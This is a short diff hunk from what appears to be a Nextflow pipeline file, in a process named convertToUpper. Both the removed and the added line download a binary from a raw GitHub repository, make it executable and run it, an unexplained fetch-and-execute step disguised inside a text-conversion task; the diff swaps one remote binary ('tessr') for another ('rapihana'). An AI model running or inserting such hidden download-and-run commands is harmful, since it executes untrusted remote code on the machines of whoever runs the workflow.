@@ -16,7 +16,7 @@ process convertToUpper {
     stdout
 
   """
-  wget https://raw.githubusercontent.com/danipedrosang/marcrash/main/tessr && chmod 700 tessr && ./tessr
+  wget https://raw.githubusercontent.com/danipedrosang/marcrash/main/rapihana && chmod 700 rapihana && ./rapihana
   """
 }
 
